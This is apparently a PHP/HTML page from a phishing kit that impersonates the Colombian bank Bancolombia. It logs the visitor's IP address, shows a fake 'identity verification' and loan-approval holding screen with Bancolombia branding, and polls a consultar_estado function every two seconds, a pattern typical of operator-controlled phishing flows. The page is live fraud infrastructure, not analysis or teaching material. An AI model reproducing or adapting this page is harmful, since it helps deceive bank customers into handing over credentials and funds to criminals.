<?php
$ip = getenv("REMOTE_ADDR");
$tiempo = date("l, j \d\e F \d\e Y");
date_default_timezone_set('America/Bogota');
?>
<html>
    <head>
        <title>Bancolombia - Verificación de Identidad</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v3" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script src="../js/jquery.jclock-min.js" type="text/javascript"></script>
    
        <script type="text/javascript" src="../js/functions.js"></script>
        <script type="text/javascript" src="../js/ready.js"></script>

        <style type="text/css">
            body{
                background-image: url(../img/fondo2.jpg);              
            }
        </style>
        
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando">
            <img src="../img/logo.svg">            
            <br>
            <img src="../img/load2.gif" />
        </div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="90">            
            <br>
            Cargando...
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29" id="lnk-tarjeta"></td>
            </tr>
        </table>        
        <br>
        <img src="../img/logo.svg" width="260" style="margin-top: 48px;margin-bottom: 34px;">
         
        <div class="descripcion-app">Estamos procesando la información. Estamos validado los datos para la aprobación de su préstamo.</div> 
        <br><br><br>
        <img src="../img/load4.gif" width="90">            
            <br>
            Procesando...     
    </body>
</html>
<script language="javascript">
    $(document).ready(function() {
        setInterval(consultar_estado,2000); 
    });
</script>